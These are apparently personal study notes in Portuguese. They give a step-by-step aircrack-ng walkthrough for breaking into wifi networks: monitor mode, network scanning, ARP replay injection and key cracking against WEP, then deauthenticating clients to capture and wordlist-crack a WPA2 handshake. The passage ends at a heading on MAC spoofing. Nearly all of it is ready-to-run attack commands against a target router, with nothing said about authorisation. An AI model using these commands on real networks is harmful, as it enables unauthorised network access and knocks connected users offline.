- adaptador wireless ou placa de rede que vem no notebook para testes
- iwconfig

### processo para habilitar modo monitor de seu adaptador wireless
- airmon-ng check
- airmon-ng check kill
- airmon-ng start wlan0

obs: modo monitor é necessario para listar todas as redes wifi próximas

### listar redes wifi disponiveis perto

- airodump-ng wlan [nome de sua interface wireless]
- ---
- BSSID é o endereço MAC dos roteadores
- PWR é o nivel de intensidade das redes listadas
- Beacons são os chamados envios do roteador
- Data são os dados que se da pra interceptar
- MB conectividade
- ENC tipo de criptografia (obs: visto em algumas aulas que a criptografia WEP que é bem antiga e legada)
- ESSID nome da rede
- ---

### começando a dar uma brincada
- airodump-ng -c [canal, por exemplo "1"] [nome de sua interface wireless]  (travar conectividade em um determinado tipo de canal wireless, util pra quando se quer fazer algo nela sem que haja oscilação)
- airodump-ng -c [canal, por exemplo "1"] --bssid [endereço MAC roteador alvo] -w [nome do arquivo que vc quer que salve tudo o que for capturado] [nome da sua interface wireless]  (captura alguns pacotes de autenticação ou outras informações uteis, lembrando que esse comando é mais focado para ENC WEP)

### arp injection via ENC WEP (o mais simples) para gerar dados a rede alvo

esse comando foca em enviar dados adcionais a outros roteadores fazendo se passarem por eles mesmos usando o station deles, isso é útil para gerar pacotes adcionais de dados para usarmos o aircrack e assim possivelmente conseguir quebrar a senha wifi do alvo)

- aireplay-ng -3 -b [bssid] -h [station de um dos bssid encontrados no comando acima] [nome da sua interface wireless]

### air crack para quebra de senhas wifi (ENC WEP o mais simples, legado)

- aircrack-ng -a [canal, por exemplo "1"] [nome-do-arquivo-que-vc-salvou-no-airodump-.cap]

---
### Atacando rede WPA2

- airodump-ng [sua interface]
- airodump-ng -c 1 --bssid [bssid do alvo] -w redeWPA  [sua interface wireless] -> salvando esse pacote wpa2 do alvo em um arquivo redeWPA
- Precisa agora que haja uma nova conexão com a rede alvo para que possamos capturar o handshake (podemos utilizar o comando abaixo para remover a autenticação de dispositivos atuais na rede)
- aireplay-ng -0 3 -e [nome da rede alvo] [sua interface wireless]
- Agora deve ter aparecido um handshake naquele nosso comando de redeWPA e pode parar a captura agora.
- ls -l redeWPA-01* 
- aircrack-ng -w [wordlist] [caminho-do-arquivo-dos-pacotes-]
- key found! [senha encontrada]

---

### Manipulando MacAddress para se conectar a uma rede wireless
